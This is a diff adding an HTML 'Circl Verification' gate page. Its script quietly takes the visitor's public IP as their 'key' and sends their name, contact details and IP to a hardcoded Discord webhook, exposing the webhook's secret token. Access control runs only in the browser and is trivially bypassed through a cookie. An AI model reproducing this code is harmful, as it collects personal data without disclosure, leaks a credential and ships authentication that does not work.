@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Circl Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #000;
+    }
+    input, select {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #000;
+      border-radius: 5px;
+    }
+    button {
+      width: calc(100% - 20px);
+      padding: 10px;
+      background-color: #000;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #333;
+    }
+    a {
+      color: #000;
+    }
+    a:hover {
+      color: #333;
+    }
+    .error {
+      color: red;
+      text-align: center;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Enter Your Circl Key</h2>
+    <form id="keyForm" onsubmit="validateKey(); return false;">
+      <input type="text" id="keyInput" pattern="\d{10}" maxlength="10" required>
+      <button type="submit">LET ME IN!</button>
+    </form>
+    <h2>Get a Key</h2>
+    <form id="getKeyForm">
+      <input type="text" id="fullName" placeholder="Your Full Name" required>
+      <select id="platform">
+        <option value="Android">Android</option>
+        <option value="iOS">Apple</option>
+      </select>
+      <input type="text" id="contact" placeholder="Your Contact Information" required>
+      <button type="submit">Submit</button>
+      <div id="errorMessage" class="error" style="display: none;">Invalid key. Please try again.</div>
+    </form>
+  </div>
+
+  <script>
+    function validateKey() {
+      var key = document.getElementById("keyInput").value;
+      var userKey = localStorage.getItem("userKey"); // Get user's key from local storage
+      if (key === userKey) {
+        window.location.href = "https://www.google.com";
+      } else {
+        document.getElementById("errorMessage").style.display = "block";
+      }
+    }
+
+    function getUserKey() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var userKey = data.ip.replace(/\./g, ''); // Remove dots from the IP address
+          localStorage.setItem("userKey", userKey); // Store user's key in local storage
+        })
+        .catch(error => console.error('Error:', error));
+    }
+    
+    getUserKey(); // Call getUserKey function to get the user's key
+
+    document.getElementById("getKeyForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      var fullName = document.getElementById("fullName").value;
+      var platform = document.getElementById("platform").value;
+      var contact = document.getElementById("contact").value;
+      var userKey = localStorage.getItem("userKey");
+      var formData = {
+        "content": "New key request:\nFull Name: " + fullName + "\nPlatform: " + platform + "\nContact Information: " + contact + "\nUser's Key: " + userKey
+      };
+
+      fetch("https://discord.com/api/webhooks/1250279791178027051/DqhNgKZFPNyeAbXh6_hHxSxwdjZcWyObcCbHG9BGptkDiRYePagiI0DBWj90lwxnFs5u", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(formData)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Failed to submit form.");
+        }
+        alert("Key request submitted successfully!");
+        document.getElementById("getKeyForm").reset();
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("Failed to submit form. Please try again later.");
+      });
+      
+      // Set a cookie to indicate that the user is logged in
+      document.cookie = "loggedIn=true";
+    });
+    
+    // Check if user is logged in and redirect if necessary
+    window.onload = function() {
+      var cookies = document.cookie.split("; ");
+      for (var i = 0; i < cookies.length; i++) {
+        var cookie = cookies[i].split("=");
+        if (cookie[0] === "loggedIn" && cookie[1] === "true") {
+          window.location.href = "https://www.google.com";
+        }
+      }
+    };
+  </script>
+</body>
+</html>
